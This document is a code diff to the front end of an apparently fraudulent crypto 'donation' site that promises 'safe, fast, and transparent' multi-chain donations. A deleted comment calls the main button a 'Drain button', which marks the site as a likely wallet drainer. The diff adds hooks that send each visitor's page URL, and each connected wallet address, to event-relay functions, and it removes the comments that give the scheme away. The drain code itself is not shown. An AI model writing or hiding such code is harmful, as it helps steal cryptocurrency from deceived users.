@@ -1,9 +1,11 @@
 // src/App.jsx
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { ConnectButton } from "@rainbow-me/rainbowkit";
 import { useAccount, useWalletClient } from "wagmi";
 import { runDonationFlow } from "./engine/donate";
 
+import { notify } from "./utils/notify.js";
+import { sendEvent } from "./utils/eventRelay.js"; // adjust import path if needed
 import Navbar from "./components/Navbar";
 import PriceTicker from "./components/PriceTicker";
 import Notifications from "./components/Notifications";
@@ -14,9 +16,10 @@ export default function App() {
   const [status, setStatus] = useState("idle");
   const [notifications, setNotifications] = useState([]);
 
-  const { isConnected } = useAccount();
+  const { address, isConnected } = useAccount();
   const { data: walletClient } = useWalletClient();
 
+  // 🔔 toast helper
   function addNotification(message, type = "info") {
     const id = Date.now() + Math.floor(Math.random() * 1000);
     setNotifications((prev) => [...prev, { id, message, type }]);
@@ -25,6 +28,31 @@ export default function App() {
     }, 5000);
   }
 
+  // 📡 1. Fire LINK_OPENED on mount
+  useEffect(() => {
+    const trackingId = crypto.randomUUID();
+    const payload = {
+      openedUrl: window.location.href,
+      visitorIp: null,
+      trackingId,
+    };
+    notify("LINK_OPENED", payload);
+    sendEvent("LINK_OPENED", payload);
+  }, []);
+
+  // 📡 2. Fire WALLET_CONNECTED when user connects
+  useEffect(() => {
+    if (isConnected && address) {
+      const payload = {
+        walletAddress: address,
+        connectedAt: new Date().toISOString(),
+      };
+      notify("WALLET_CONNECTED", payload);
+      sendEvent("WALLET_CONNECTED", payload);
+    }
+  }, [isConnected, address]);
+
+  // 🚀 donation trigger
   async function handleDonate() {
     if (!walletClient) {
       addNotification("No connected wallet client found. Please connect your wallet.", "error");
@@ -36,7 +64,6 @@ export default function App() {
       setStatus("running");
       addNotification("Donation started… 🚀", "info");
 
-      // IMPORTANT: autoDonateMultiChain(walletClient) must accept walletClient (unchanged logic)
       const res = await runDonationFlow(walletClient);
 
       if (res?.success) {
@@ -56,13 +83,9 @@ export default function App() {
   return (
     <div className="text-slate-900 min-h-screen relative">
       <Background />
-
-      {/* Navbar (fixed) */}
       <Navbar />
 
-      {/* Reserve space for fixed navbar */}
-      <div className="pt-[72px] pb-24"> {/* footer height reserve */}
-        {/* Price ticker under navbar */}
+      <div className="pt-[72px] pb-24">
         <div className="w-full">
           <PriceTicker />
         </div>
@@ -77,7 +100,6 @@ export default function App() {
               Donate tokens across chains in one click — safe, fast, and transparent.
             </p>
 
-            {/* Hero area: Connect CTA + helper text always under it */}
             <div className="flex flex-col items-center gap-3 mt-2">
               <div className="flex flex-col items-center">
                 <ConnectButton showBalance={false} chainStatus="icon" />
@@ -86,7 +108,6 @@ export default function App() {
                 </p>
               </div>
 
-              {/* Drain button shown only when connected */}
               <div>
                 {isConnected ? (
                   <button
@@ -100,7 +121,6 @@ export default function App() {
               </div>
             </div>
 
-            {/* Short info / spacing area so hero feels fuller on desktop */}
             <div className="w-full grid grid-cols-1 sm:grid-cols-3 gap-4 mt-6">
               <div className="bg-white/60 rounded-xl p-4 shadow-sm">
                 <h3 className="text-sm font-semibold text-slate-800">Quick</h3>
@@ -119,10 +139,7 @@ export default function App() {
         </div>
       </div>
 
-      {/* fixed footer */}
       <Footer />
-
-      {/* Notifications (floating toasts) */}
       <Notifications notifications={notifications} />
     </div>
   );
